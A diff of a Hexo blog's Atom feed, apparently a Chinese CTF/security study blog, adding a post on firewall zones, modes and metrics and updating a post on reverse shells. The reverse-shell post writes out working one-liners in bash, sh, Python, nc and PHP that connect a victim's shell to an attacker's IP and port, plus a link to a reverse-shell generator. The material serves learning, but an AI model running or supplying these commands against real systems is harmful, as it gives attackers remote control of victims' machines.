@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-06-11T11:48:00.348Z</updated>
+  <updated>2020-06-19T07:32:02.995Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>防火墙配置</title>
+    <link href="http://yoursite.com/2020/06/13/%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/"/>
+    <id>http://yoursite.com/2020/06/13/%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</id>
+    <published>2020-06-13T02:58:00.000Z</published>
+    <updated>2020-06-19T07:32:02.995Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="防火墙的基本功能"><a href="#防火墙的基本功能" class="headerlink" title="防火墙的基本功能"></a>防火墙的基本功能</h4><p> 防火墙能路由器实现路由器的所有功能。但防火墙的ip配好以后，左右两边均不连通。</p><ol><li>访问控制</li><li>攻击防护</li><li>冗余设计</li><li>路由、交换</li><li>日志记录</li><li>虚拟网络VPN</li><li>NAT</li></ol><h4 id="防火墙区域隔离"><a href="#防火墙区域隔离" class="headerlink" title="防火墙区域隔离"></a>防火墙区域隔离</h4><p>防火墙隔离出三个区域：trust、untrust、DMZ（隔离区），也可以依次表示为高、低、中。由上往下时一律放行，由下往上时不放行。</p><p>trust区域用于存放核心数据，DMZ一般为服务器提供服务。untrust区域为互联网。注意DMZ区一定不能访问trust区，防止DMZ区域被渗透时，核心数据的泄露。（hacker可通过攻击DMZ上的某一台服务器拿到DMZ所有服务器的权限。）</p><p><strong>防火墙只能做第一次的过滤，由trust区域访问互联网时，防火墙会通过返回的所有数据包，并不能检测出包内是否含有病毒，因此需要在trust与防火墙之间安装IPS</strong></p><p><img src="/images/pasted-64.png" alt="upload successful"></p><p>在web服务器前再放一台防火墙，用来过滤用户交互。这个防火墙就是WAF。一般的WAF产品价格都高于普通防火墙</p><h4 id="防火墙分类"><a href="#防火墙分类" class="headerlink" title="防火墙分类"></a>防火墙分类</h4><ul><li><p>按防火墙形态</p><p>   硬件防火墙</p><p>  软件防火墙</p></li></ul><ul><li><p>按防火墙技术</p><p>  包过滤防火墙</p><p>  WAF防火墙</p><p>  应用(代理)防火墙</p><p> 状态检测包防火墙</p><p> 应用层防火墙</p></li></ul><h4 id="状态检测FW工作原理"><a href="#状态检测FW工作原理" class="headerlink" title="状态检测FW工作原理"></a>状态检测FW工作原理</h4><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>当内网某个ip想要访问外网时，首先经过防火墙进行状态检测，如果在状态检测表中存在，则直接放行。会在状态检测表中添加此次会话，将源ip进行nat地址转换，发出数据包，会话维持的时间可自定义，一般是1min。如果在状态检测表中存在，则直接放行。</p><p><img src="/images/pasted-66.png" alt="upload successful"></p><h4 id="衡量防火墙性能的五大指标"><a href="#衡量防火墙性能的五大指标" class="headerlink" title="衡量防火墙性能的五大指标"></a>衡量防火墙性能的五大指标</h4><ol><li>吞吐量：在不丢包的情况下单位时间内通过的数据报流量。</li><li>时延：数据报第一个比特进入防火墙到最后一比特从防火墙输出的时间间隔。</li><li>丢包率</li><li>并发连接数：可以同时处理的点对点连接的最多数目。</li><li>新建连接数：不丢包的情况下每秒可以建立的最大连接数。</li></ol><h4 id="防火墙工作模式"><a href="#防火墙工作模式" class="headerlink" title="防火墙工作模式"></a>防火墙工作模式</h4><h5 id="透明模式"><a href="#透明模式" class="headerlink" title="透明模式"></a>透明模式</h5><p>内网、外网及DMZ区处于同一网段,此时的防火墙相当于交换机，但仍可以做区域隔离。虽然不同区域处于同一网段，但彼此不能ping通。</p><p>优点：朝网络中加入防火墙时，不会影响原本的网络结构，只需要装上防火墙，设置策略即可。此时防火墙工作在二层（数据链路层）</p><p><img src="/images/pasted-67.png" alt="upload successful"></p><h5 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h5><p>防火墙工作在三层,此时相当于三层交换机</p><p><img src="/images/pasted-68.png" alt="upload successful"></p><h5 id="混杂模式（标准应用）"><a href="#混杂模式（标准应用）" class="headerlink" title="混杂模式（标准应用）"></a>混杂模式（标准应用）</h5><p><img src="/images/pasted-69.png" alt="upload successful"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;防火墙的基本功能&quot;&gt;&lt;a href=&quot;#防火墙的基本功能&quot; class=&quot;headerlink&quot; title=&quot;防火墙的基本功能&quot;&gt;&lt;/a&gt;防火墙的基本功能&lt;/h4&gt;&lt;p&gt; 防火墙能路由器实现路由器的所有功能。但防火墙的ip配好以后，左右两边均不连通。&lt;/p&gt;
+&lt;
+      
+    
+    </summary>
+    
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>SSRF及weblogic漏洞实战</title>
@@ -252,9 +277,9 @@
     <link href="http://yoursite.com/2020/05/24/shell%E5%8F%8D%E5%BC%B9/"/>
     <id>http://yoursite.com/2020/05/24/shell%E5%8F%8D%E5%BC%B9/</id>
     <published>2020-05-24T08:39:07.000Z</published>
-    <updated>2020-06-12T11:59:24.463Z</updated>
+    <updated>2020-06-12T12:02:30.464Z</updated>
     
-    <content type="html"><![CDATA[<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。某些情况下正向连接不太好使。</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h4 id="现在谈一下shell反弹的方法。"><a href="#现在谈一下shell反弹的方法。" class="headerlink" title="现在谈一下shell反弹的方法。"></a>现在谈一下shell反弹的方法。</h4><p>kali：192.168.124.128</p><p>centos7：192.168.124.132</p><h5 id="1-bash反弹"><a href="#1-bash反弹" class="headerlink" title="1. bash反弹"></a>1. bash反弹</h5><ul><li><p>通过 <code>nc -lvp port</code> 监听本机的一个端口号</p></li><li><p>使用 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>或<code>bash -i &gt; /dev/tcp/ip/post 0&gt;&amp;1 2&gt;&amp;1</code></p></li></ul><p>反弹shell。这是经典的反弹shell的语句，这里分析一下原理。</p><ol><li>使用<code>bash -i</code> 启动交互式shell</li><li><code>&gt;&amp;</code> 将stdout 1,stderr 2都指向主机的端口</li><li><code>0&gt;&amp;1</code> 将stdin 0 指向主机端口。</li></ol><ul><li>这样0,1,2 都指向了主机端口。受害机通过端口读取主机的命令并执行，将执行的结果输出到主机上。就实现了将受害机的shell弹给主机。</li></ul><p><img src="/images/pasted-60.png" alt="upload successful"></p><p><img src="/images/pasted-59.png" alt="upload successful"></p><h5 id="2-sh反弹"><a href="#2-sh反弹" class="headerlink" title="2. sh反弹"></a>2. sh反弹</h5><p>原理和bash反弹相同</p><p><code>sh &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></p><h5 id="3-Python方式"><a href="#3-Python方式" class="headerlink" title="3. Python方式"></a>3. Python方式</h5><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><p><img src="/images/pasted-61.png" alt="upload successful"></p><h5 id="4-nc反弹"><a href="#4-nc反弹" class="headerlink" title="4. nc反弹"></a>4. nc反弹</h5><p>PS：必须服务器安装了nc。可以用<code>nc --help</code>检验</p><ul><li>存在-e参数时可以直接反弹 </li></ul><p><code>nc -e /bin/bash ip port</code> </p><p><img src="/images/pasted-62.png" alt="upload successful"></p><ul><li>不存在-e时 </li></ul><p><code>mknod backpipe p; nc IP PORT 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</code></p><p><img src="/images/pasted-63.png" alt="upload successful"></p><h5 id="5-php方式"><a href="#5-php方式" class="headerlink" title="5.php方式"></a>5.php方式</h5><p><code>php -r &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT&quot;)&#39;</code></p><p>或</p><p><code>php -r &#39;$sock=fsockopen(&quot;IP&quot;,PORT);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>]]></content>
+    <content type="html"><![CDATA[<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。某些情况下正向连接不太好使。</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h4 id="现在谈一下shell反弹的方法。"><a href="#现在谈一下shell反弹的方法。" class="headerlink" title="现在谈一下shell反弹的方法。"></a>现在谈一下shell反弹的方法。</h4><p>kali：192.168.124.128</p><p>centos7：192.168.124.132</p><h5 id="1-bash反弹"><a href="#1-bash反弹" class="headerlink" title="1. bash反弹"></a>1. bash反弹</h5><ul><li><p>通过 <code>nc -lvp port</code> 监听本机的一个端口号</p></li><li><p>使用 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>或<code>bash -i &gt; /dev/tcp/ip/post 0&gt;&amp;1 2&gt;&amp;1</code></p></li></ul><p>反弹shell。这是经典的反弹shell的语句，这里分析一下原理。</p><ol><li>使用<code>bash -i</code> 启动交互式shell</li><li><code>&gt;&amp;</code> 将stdout 1,stderr 2都指向主机的端口</li><li><code>0&gt;&amp;1</code> 将stdin 0 指向主机端口。</li></ol><ul><li>这样0,1,2 都指向了主机端口。受害机通过端口读取主机的命令并执行，将执行的结果输出到主机上。就实现了将受害机的shell弹给主机。</li></ul><p><img src="/images/pasted-60.png" alt="upload successful"></p><p><img src="/images/pasted-59.png" alt="upload successful"></p><h5 id="2-sh反弹"><a href="#2-sh反弹" class="headerlink" title="2. sh反弹"></a>2. sh反弹</h5><p>原理和bash反弹相同</p><p><code>sh &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></p><h5 id="3-Python方式"><a href="#3-Python方式" class="headerlink" title="3. Python方式"></a>3. Python方式</h5><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><p><img src="/images/pasted-61.png" alt="upload successful"></p><h5 id="4-nc反弹"><a href="#4-nc反弹" class="headerlink" title="4. nc反弹"></a>4. nc反弹</h5><p>PS：必须服务器安装了nc。可以用<code>nc --help</code>检验</p><ul><li>存在-e参数时可以直接反弹 </li></ul><p><code>nc -e /bin/bash ip port</code> </p><p><img src="/images/pasted-62.png" alt="upload successful"></p><ul><li>不存在-e时 </li></ul><p><code>mknod backpipe p; nc IP PORT 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</code></p><p><img src="/images/pasted-63.png" alt="upload successful"></p><h5 id="5-php方式"><a href="#5-php方式" class="headerlink" title="5.php方式"></a>5.php方式</h5><p><code>php -r &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT&quot;)&#39;</code></p><p>或</p><p><code>php -r &#39;$sock=fsockopen(&quot;IP&quot;,PORT);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><a href="https://krober.biz/misc/reverse_shell.php" target="_blank" rel="noopener">附上一个shell反弹的神器</a></p>]]></content>
     
     <summary type="html">
     
